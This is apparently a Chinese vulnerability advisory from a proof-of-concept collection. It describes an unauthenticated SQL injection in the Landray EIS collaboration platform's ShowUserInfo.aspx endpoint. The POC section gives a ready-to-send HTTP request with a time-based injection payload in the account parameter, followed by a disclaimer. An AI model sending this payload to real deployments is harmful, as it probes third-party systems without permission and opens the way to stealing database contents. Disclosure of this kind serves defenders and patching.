# 蓝凌EIS智慧协同平台SQL注入

>蓝凌EIS智慧协同平台是一款专为企业提供高效协同办公和团队合作的产品。该平台集成了各种协同工具和功能，旨在提升企业内部沟通、协作和信息共享的效率。

## 漏洞描述

蓝凌EIS智慧协同平台ShowUserInfo.aspx接口处未对用户输入的SQL语句进行过滤或验证导致出现SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库敏感信息。

## 漏洞类型

SQL注入

## 漏洞影响

-   蓝凌EIS智慧协同平台

## POC

```http
GET /third/DingTalk/Demo/ShowUserInfo.aspx?account=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-T
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
